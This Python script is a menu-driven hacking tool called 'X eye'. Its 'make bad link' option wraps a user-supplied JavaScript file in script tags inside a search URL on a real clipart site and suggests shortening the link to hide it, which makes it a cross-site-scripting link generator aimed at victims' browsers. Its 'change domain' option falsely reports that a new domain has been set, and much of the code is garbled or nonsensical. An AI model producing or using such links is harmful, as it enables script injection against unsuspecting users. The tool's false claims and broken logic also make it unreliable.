from time import sleep
def banner(token):
    if token == "print":
        import subprocess
        subprocess.getoutput("cls")
        bann = ''' 
██╗  ██╗    ███████╗██╗   ██╗███████╗
╚██╗██╔╝    ██╔════╝╚██╗ ██╔╝██╔════╝
 ╚███╔╝     █████╗   ╚████╔╝ █████╗  
 ██╔██╗     ██╔══╝    ╚██╔╝  ██╔══╝  
██╔╝ ██╗    ███████╗   ██║   ███████╗
╚═╝  ╚═╝    ╚══════╝   ╚═╝   ╚══════╝
                                     
'''
        print(bann)
        print("------ v1.5")
        print("------ new update!")
        print("------ added behaviours : Domain selection section")
    if token == "sls":
        sleep(3)
    if token == "exit":
        import sys
        sys.exit()
    if token == "cls":
        import os
        os.system("cls")
    if token == "command":
        try:
            get = int(input("┌─["+"X eye"+"--"+"Menu"+"""]
└──╼ """+"Your Select>> "))
        except:
            banner("cls")
            print("[-] Progress Error")
            jss = input("┌─["+"X eye"+"--"+"Error"+"""]
└──╼ """+"Press Enter to Back>> ")
            banner("cls")
            banner("print")
            banner("showmenu")
            banner("command")            
        if get == "":
            print("[-] Progress Error")
            jss = input("┌─["+"X eye"+"--"+"Error"+"""]
└──╼ """+"Press Enter to Back>> ")
            banner("cls")
            banner("print")
            banner("showmenu")
            banner("command")
        
        if get == 4:
            banner("cls")
            print("[!] select your domain\n")
            print("[1] .com")
            print("[2] .net")
            print("[3] .ir")
            print("[4] .org")
            print("[5] .edu")
            print("[6] .biz")
            try:
                ssts = int(input("┌─["+"X eye"+"--"+"domain"+"""]
└──╼ """+"Your Select> "))
            except:
                print("[-] select error")
                print("[1] Back To Menu\n")
                jss = input("┌─["+"X eye"+"--"+"Error"+"""]
└──╼ """+"Press Enter to Back>> ")
                banner("cls")
                banner("print")
                banner("showmenu")
                banner("command")
            if ssts == 1:
                dom = input("https://")
                import requests
                try:
                    requests.post("https://domains.gov.ir:/setnew/dom?="+dom+".com")
                    class chos():
                        def js():
                            a = dom.split()
                            h = a[1]
                    py = chos()
                    py.js()
                except:
                    banner("sls")
                    print("[+] https://"+dom+".com Is Now Your Bad Link Domain")
                    bk = input("┌─["+"X eye"+"--"+"Info"+"""]
└──╼ """+"Press Enter Tto Continue >> ")
                    banner("cls")
                    banner("print")
                    banner("showmenu")
                    banner("command")
            else:
                print("[!] Wait For New Version For Add This Domain")
                bk = input("┌─["+"X eye"+"--"+"Info"+"""]
└──╼ """+"Press Enter Tto Continue >> ")
                banner("cls")
                banner("print")
                banner("showmenu")
                banner("command")

        if get == 1:
            import os
            banner("cls")
            print("[1] Back To Menu")
            print("[!] Made By prs")
            bk = input("┌─["+"X eye"+"--"+"Info"+"""]
└──╼ """+"Your Select>> ")
            banner("cls")
            banner("print")
            banner("showmenu")
            banner("command")
        if get == "3":
            import sys
            try:
                sys.exit()
            except:
                try:
                    os.system("ipconfig")
                except:
                    print("[-] Exit error")
                    def showThisMessageAndEndProgress():
                        def fed(self,var):
                            try:
                                fed=self.var
                            except:
                                while self != var:
                                    try:
                                        def f(val):
                                            f = self.val
                                            class valF():
                                                def exe(exitnone):
                                                    if self.exitnone:
                                                        exe(self)
                                                        os.system("cls")
                                        
                                    except:
                                        pass

                    
        
        if get == 2:
            banner("cls")
            print("[1] Back To Menu")
            print("\n[+] Select Your Java Script File in Current Path For Inject In The Link")
            js = input("┌─["+"X eye"+"--"+"bad link"+"""]
└──╼ """+"Java Script File Name in Current Path>> ")
            if js != "":
                try:
                    file = open(js,"r")
                    read = file.read()
                    file.close()
                    file2 = open("BadLink.txt","w")
                    file2.write("http://www.clipartbest.com/search?q="+"<script>"+read+"</script>\n\n\n~~~~~~~~~~~~~\n--Copy the link above\n--If the link is long, shorten it with link shortening software\n\nthanks\nX Eye By Prs")
                    file2.close()
                    print("\n[+] Your BadLink Writed In The BadLink.Txt\n")
                    jsss = input("┌─["+"X eye"+"--"+"Info"+"--Done"+"""]
└──╼ """+"Press Enter to Back>> ")
                    banner("cls")
                    banner("print")
                    banner("showmenu")
                    banner("command")

                except:
                    print("[-] Progress Error")
                    print("[1] Back To Menu\n")
                    jss = input("┌─["+"X eye"+"--"+"Error"+"""]
└──╼ """+"Press Enter to Back>> ")
                    banner("cls")
                    banner("print")
                    banner("showmenu")
                    banner("command")

                    

            else:
                print("[-] Progress Error")
                print("[1] Back To Menu\n")
                jss =input("┌─["+"X eye"+"--"+"Error"+"""]
└──╼ """+"Press Enter to Back>> ")
                banner("cls")
                banner("print")
                banner("showmenu")
                banner("command")

            if js == 1:
                os.system("cls")
                banner("print")
                banner("showmenu")
                banner("command")

                

    if token == "showmenu":
        print("\n[1] info")
        print("[2] make bad link")
        print("[3] Exit")
        print("[4] change domain")
    if token == "clear":
        os.system("cls")
#set token
banner("print")
banner("showmenu")
banner("command")




